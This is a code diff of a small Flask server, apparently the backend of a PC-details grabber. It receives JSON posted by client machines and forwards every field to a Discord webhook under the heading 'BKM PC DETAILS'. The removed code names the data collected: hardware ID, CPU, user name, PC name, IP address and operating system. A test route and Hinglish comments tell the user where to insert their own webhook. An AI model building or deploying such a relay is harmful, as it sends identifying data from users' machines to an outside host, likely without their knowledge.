@@ -4,7 +4,8 @@ import os
 
 app = Flask(__name__)
 
-WEBHOOK_URL = "YOUR_WEBHOOK_HERE"
+# 🔥 APNA DISCORD WEBHOOK YAHAN DAAL
+WEBHOOK_URL = "PUT_YOUR_NEW_WEBHOOK_HERE"
 
 
 @app.route("/")
@@ -15,38 +16,43 @@ def home():
 @app.route("/log", methods=["POST"])
 def log():
     try:
+        # ✅ GET DATA
         data = request.get_json(force=True)
-
-        print("DATA:", data)
+        print("RECEIVED DATA:", data)
 
         if not data:
             return jsonify({"error": "No data"}), 400
 
-        embed = {
-            "title": "BKM PC DETAILS",
-            "color": 65280,
-            "fields": [
-                {"name": "HWID", "value": str(data.get("uuid")), "inline": False},
-                {"name": "CPU", "value": str(data.get("cpu")), "inline": False},
-                {"name": "User", "value": str(data.get("user")), "inline": True},
-                {"name": "PC", "value": str(data.get("pc")), "inline": True},
-                {"name": "IP", "value": str(data.get("ip")), "inline": False},
-                {"name": "OS", "value": str(data.get("os")), "inline": False}
-            ]
-        }
+        # ✅ SIMPLE MESSAGE (NO EMBED)
+        message = "🔥 BKM PC DETAILS\n\n"
 
-        try:
-            r = requests.post(WEBHOOK_URL, json={"embeds": [embed]})
-            print("DISCORD:", r.status_code, r.text)
-        except Exception as e:
-            print("Webhook Error:", e)
+        for key, value in data.items():
+            message += f"{key.upper()}: {value}\n"
+
+        # 🚀 SEND TO DISCORD
+        r = requests.post(WEBHOOK_URL, json={
+            "content": message
+        })
+
+        print("DISCORD STATUS:", r.status_code)
+        print("DISCORD RESPONSE:", r.text)
 
         return jsonify({"status": "ok"})
 
     except Exception as e:
-        print("SERVER ERROR:", e)
+        print("ERROR:", e)
         return jsonify({"error": str(e)}), 500
 
 
+# 🔥 TEST ROUTE (VERY IMPORTANT)
+@app.route("/test")
+def test():
+    r = requests.post(WEBHOOK_URL, json={
+        "content": "🔥 BKM TEST SUCCESS"
+    })
+    return f"Test Sent → {r.status_code}"
+
+
+# 🔥 HOSTING
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
